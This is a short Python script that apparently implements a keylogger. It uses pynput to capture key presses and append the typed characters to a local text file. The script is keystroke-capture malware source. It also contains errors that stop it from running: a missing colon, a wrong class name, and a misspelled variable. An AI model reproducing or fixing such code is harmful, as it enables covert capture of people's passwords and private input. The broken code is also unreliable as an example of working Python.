from pynput import keyboard

def keyPressed(key)
    print(str(key))
    with open("keyfile.txt",'a')as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")
if __name__=="__main__":
  listner=keyboard.listener(on_press=keyPressed)
  listener.start()
  input()
  
